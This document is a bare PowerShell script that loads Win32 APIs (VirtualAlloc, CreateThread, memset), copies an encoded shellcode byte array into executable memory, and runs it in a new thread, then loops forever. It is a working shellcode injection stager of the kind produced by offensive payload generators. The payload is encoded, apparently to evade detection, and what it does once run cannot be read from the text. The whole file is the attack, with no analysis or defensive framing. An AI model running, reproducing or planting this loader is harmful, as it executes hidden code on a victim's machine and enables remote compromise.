$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x57,0xa5,0xea,0xa0,0xd9,0xc6,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x56,0x0f,0x03,0x56,0x58,0x47,0x1f,0x5c,0x8e,0x05,0xe0,0x9d,0x4e,0x6a,0x68,0x78,0x7f,0xaa,0x0e,0x08,0x2f,0x1a,0x44,0x5c,0xc3,0xd1,0x08,0x75,0x50,0x97,0x84,0x7a,0xd1,0x12,0xf3,0xb5,0xe2,0x0f,0xc7,0xd4,0x60,0x52,0x14,0x37,0x59,0x9d,0x69,0x36,0x9e,0xc0,0x80,0x6a,0x77,0x8e,0x37,0x9b,0xfc,0xda,0x8b,0x10,0x4e,0xca,0x8b,0xc5,0x06,0xed,0xba,0x5b,0x1d,0xb4,0x1c,0x5d,0xf2,0xcc,0x14,0x45,0x17,0xe8,0xef,0xfe,0xe3,0x86,0xf1,0xd6,0x3a,0x66,0x5d,0x17,0xf3,0x95,0x9f,0x5f,0x33,0x46,0xea,0xa9,0x40,0xfb,0xed,0x6d,0x3b,0x27,0x7b,0x76,0x9b,0xac,0xdb,0x52,0x1a,0x60,0xbd,0x11,0x10,0xcd,0xc9,0x7e,0x34,0xd0,0x1e,0xf5,0x40,0x59,0xa1,0xda,0xc1,0x19,0x86,0xfe,0x8a,0xfa,0xa7,0xa7,0x76,0xac,0xd8,0xb8,0xd9,0x11,0x7d,0xb2,0xf7,0x46,0x0c,0x99,0x9f,0xab,0x3d,0x22,0x5f,0xa4,0x36,0x51,0x6d,0x6b,0xed,0xfd,0xdd,0xe4,0x2b,0xf9,0x22,0xdf,0x8c,0x95,0xdd,0xe0,0xec,0xbc,0x19,0xb4,0xbc,0xd6,0x88,0xb5,0x56,0x27,0x35,0x60,0xc2,0x22,0xa1,0xdf,0x6f,0xf6,0x8b,0x88,0x8d,0x08,0xfe,0xfb,0x1b,0xee,0x50,0xac,0x4b,0xbf,0x10,0x1c,0x2c,0x6f,0xf8,0x76,0xa3,0x50,0x18,0x79,0x69,0xf9,0xb2,0x96,0xc4,0x51,0x2a,0x0e,0x4d,0x29,0xcb,0xcf,0x5b,0x57,0xcb,0x44,0x68,0xa7,0x85,0xac,0x05,0xbb,0x71,0x5d,0x50,0xe1,0xd7,0x62,0x4e,0x8c,0xd7,0xf6,0x75,0x07,0x80,0x6e,0x74,0x7e,0xe6,0x30,0x87,0x55,0x7d,0xf8,0x1d,0x16,0xe9,0x05,0xf2,0x96,0xe9,0x53,0x98,0x96,0x81,0x03,0xf8,0xc4,0xb4,0x4b,0xd5,0x78,0x65,0xde,0xd6,0x28,0xda,0x49,0xbf,0xd6,0x05,0xbd,0x60,0x28,0x60,0x3f,0x5c,0xff,0x4c,0x35,0x8c,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};